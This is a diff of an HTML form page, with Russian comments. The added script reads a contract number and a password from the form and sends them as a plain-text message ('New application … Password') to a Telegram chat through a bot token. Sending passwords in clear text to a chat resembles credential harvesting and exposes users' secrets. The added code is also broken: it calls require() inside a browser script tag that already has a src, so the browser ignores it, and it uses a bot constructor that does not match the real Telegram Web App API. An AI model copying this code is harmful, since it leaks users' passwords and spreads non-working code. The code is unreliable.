@@ -17,23 +17,34 @@
     </form>
   </main>
 <script src="https://telegram.org/js/telegram-web-app.js">
-let tg = window.Telegram.WebApp;
-tg.expand();
+// Подключаем библиотеку Telegram Web App
+const Telegram = require("telegram-web-app");
 
-function register() {
-  // Получить данные из формы
-  let agreement = document.getElementById("agreement").value;
-  let password = document.getElementById("password").value;
+// Создаем объект бота
+const bot = new Telegram({
+  // Токен бота
+  token: "YOUR_BOT_TOKEN",
+  // Айди чата, в который будут отправляться данные
+  chatId: "YOUR_CHAT_ID",
+});
 
-  // Отправить данные в Telegram
-  tg.sendData(JSON.stringify({
-    agreement: agreement,
-    password: password
-  }));
+// Обработчик события отправки формы
+document.querySelector("#order").addEventListener("click", async () => {
+  // Получаем данные из полей формы
+  const agreement = document.querySelector("#agreement").value;
+  const password = document.querySelector("#password").value;
 
-  // Закрыть приложение
-  tg.close();
-}
+  // Формируем сообщение для отправки
+  const message = {
+    // Текст сообщения
+    text: `Новая заявка:
+    Номер договора: ${agreement}
+    Пароль: ${password}`,
+  };
+
+  // Отправляем сообщение
+  await bot.sendMessage(message);
+});
 </script>
 </body>
 </html>
